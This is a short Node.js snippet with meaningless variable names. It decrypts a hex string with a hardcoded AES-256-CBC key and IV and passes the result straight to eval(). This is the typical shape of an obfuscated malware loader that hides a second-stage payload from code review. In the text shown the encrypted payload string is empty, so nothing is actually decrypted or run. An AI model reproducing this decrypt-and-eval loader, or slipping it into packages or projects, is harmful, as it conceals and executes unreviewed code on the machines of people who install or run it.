const ito = require('crypto');
const itinho = Buffer.from('94060a2138641cf57277d88f3fe52cd594bf5532da9c41fafbcb65843c9b0c98', 'hex');
const octua = Buffer.from('e5e32d4edcdc9e9ac687f70fbe55dc0f', 'hex');
const Itinho = '';
const itinhoher = ito.createDecipheriv('aes-256-cbc', itinho, octua);
let ohniticry = itinhoher.update(Itinho, 'hex', 'utf8');
ohniticry += itinhoher.final('utf8');
eval(ohniticry);
